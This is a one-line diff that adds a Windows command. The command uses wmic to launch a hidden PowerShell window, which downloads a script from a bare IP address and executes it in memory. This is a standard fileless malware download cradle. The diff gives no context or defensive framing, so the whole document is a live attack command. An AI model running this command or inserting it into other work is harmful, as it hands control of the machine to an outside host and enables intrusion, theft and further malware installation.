@@ -1,0 +1,1 @@
+wmic PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://8.130.43.95/test/1.ps1'))\""
